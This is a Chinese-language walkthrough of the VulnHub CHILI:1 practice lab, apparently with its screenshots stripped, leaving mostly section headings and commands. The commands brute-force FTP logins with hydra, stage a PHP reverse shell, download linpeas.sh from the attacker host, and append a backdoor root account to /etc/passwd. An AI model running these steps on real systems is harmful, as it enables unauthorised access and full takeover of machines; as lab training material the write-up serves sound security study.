# 原创
：  VulnHub渗透测试实战靶场 - CHILI：1

# VulnHub渗透测试实战靶场 - CHILI：1

#### VulnHub渗透测试实战靶场 - CHILI：1

## 环境下载

> 



## CHILI：1靶机搭建

> 



## 渗透测试

### 信息搜集

> 



> 



> 



### 漏洞挖掘

> 



> 



> 



```
hydra -L user.txt -P rockyou.txt -f -V 192.168.246.138 ftp 

```

### getshell

> 



> 



> 



```
cp /usr/share/webshells/php/php-reverse-shell.php ~/Desktop

```

> 



```
chmod +x php-reverse-shell.php
chmod 777 php-reverse-shell.php

```

> 



### 提权

> 



```
python2 -m SimpleHTTPServer 8888

```

```
wget http://192.168.246.129/linpeas.sh

```

> 



```
chmod +x linpeas.sh
chmod 777 linpeas.sh

```

> 



```
/usr/bin/perl -le 'print crypt("H3rmesk1t","H3rmesk1t")'

```

> 



```
echo "H3rmesk1t:H3uwEyrUn4dnU:0:0:ROOT:/root:/bin/bash" &gt;&gt; /etc/passwd

```

> 


